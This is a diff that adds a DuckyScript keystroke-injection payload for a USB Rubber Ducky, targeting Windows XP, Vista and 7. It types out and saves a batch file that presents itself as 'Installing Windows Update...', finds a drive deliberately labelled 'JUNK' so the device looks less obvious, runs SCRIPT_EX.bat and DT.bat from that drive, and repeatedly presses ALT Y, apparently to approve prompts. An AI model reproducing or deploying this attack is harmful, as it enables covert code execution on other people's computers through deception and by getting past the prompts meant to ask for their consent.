@@ -1,0 +1,112 @@
+REM Author: Lavanoid Volcanic
+REM This script supports Windows XP as well as Vista and 7.
+REM I don't have Windows 8 (I really want it though) so I cant test it.
+REM This Script looks for the drive named "JUNK" because "DUCKY" is too exposing.
+GUI d
+DELAY 500
+GUI r
+DELAY 1500
+STRING notepad.exe
+DELAY 200
+ENTER
+DELAY 1500
+STRING @echo off
+DELAY 200
+ENTER
+DELAY 200
+STRING Ti
+DELAY 200
+STRING tle = Installing Windows Update...
+DELAY 200
+ENTER
+STRING @echo Installing Windows Update...
+DELAY 200
+ENTER
+STRING COLOR F0
+DELAY 200
+ENTER
+STRING :start
+DELAY 200
+ENTER
+STRING set drive=
+DELAY 200
+ENTER
+STRING if not "%LOCALAPPDATA%"=="" goto win_new
+DELAY 200
+ENTER
+STRING for /f "tokens=3 delims= " %%A in ('echo list volume ^| diskpart ^| findstr "JUNK"') do set drive=%%A
+DELAY 200
+ENTER
+STRING if "%drive%"=="" goto start
+DELAY 200
+ENTER
+STRING set drive=%drive%:
+DELAY 200
+ENTER
+STRING if not exist "%drive%\Data\DT.bat" goto start
+DELAY 200
+ENTER
+STRING %drive%
+DELAY 200
+ENTER
+STRING CD "Data"
+DELAY 200
+ENTER
+STRING "SCRIPT_EX.bat" "DT.bat"
+DELAY 200
+ENTER
+STRING EXIT
+DELAY 200
+ENTER
+STRING :win_new
+DELAY 400
+ENTER
+DELAY 400
+STRING for /f %%d in ('wmic volume get driveletter^, label ^| findstr "JUNK"') do set drive=%%d
+DELAY 200
+ENTER
+STRING if "%drive%"=="" goto start
+DELAY 200
+ENTER
+STRING if not exist "%drive%\Data\DT.bat" goto start
+DELAY 200
+ENTER
+STRING %drive%
+DELAY 200
+ENTER
+STRING CD "Data"
+DELAY 200
+ENTER
+STRING "SCRIPT_EX.bat" "DT.bat"
+DELAY 200
+ENTER
+STRING EXIT
+DELAY 200
+ENTER
+CTRL S
+DELAY 1500
+STRING %TEMP%\DS.bat
+DELAY 1000
+ENTER
+DELAY 600
+ALT Y
+DELAY 700
+ALT F4
+GUI r
+DELAY 1500
+STRING %TEMP%\DS.bat
+ENTER
+DELAY 1000
+ALT y
+DELAY 500
+ALT y
+DELAY 500
+ALT y
+DELAY 500
+ALT y
+DELAY 500
+ALT y
+DELAY 500
+ALT y
+DELAY 500
+ALT y
